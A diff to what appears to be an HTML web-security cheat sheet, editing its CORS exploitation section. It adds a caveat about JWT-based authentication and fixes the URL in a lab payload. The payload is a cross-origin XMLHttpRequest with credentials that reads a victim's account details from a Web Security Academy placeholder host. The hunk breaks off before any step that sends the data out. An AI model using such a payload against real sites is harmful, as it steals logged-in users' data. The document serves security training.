@@ -2202,11 +2202,13 @@ Content-Length: 52<br><br>
 </code></pre></div></div>
 
 <h3 id="cors">CORS Exploitation</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>### Not exploitable if the web app using JWT/Authorization header for authentication (instead of Cookie).
+</code></pre></div></div>
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#Exfil sensitive data: Craft exploit server
 &lt;script&gt;
     var req = new XMLHttpRequest();
     req.onload = reqListener;
-    req.open(&#39;get&#39;,&#39;YOUR-LAB-ID.web-security-academy.net/accountDetails&#39;,true);
+    req.open(&#39;get&#39;,&#39;https://YOUR-LAB-ID.web-security-academy.net/accountDetails&#39;,true);
     req.withCredentials = true;
     req.send();
 
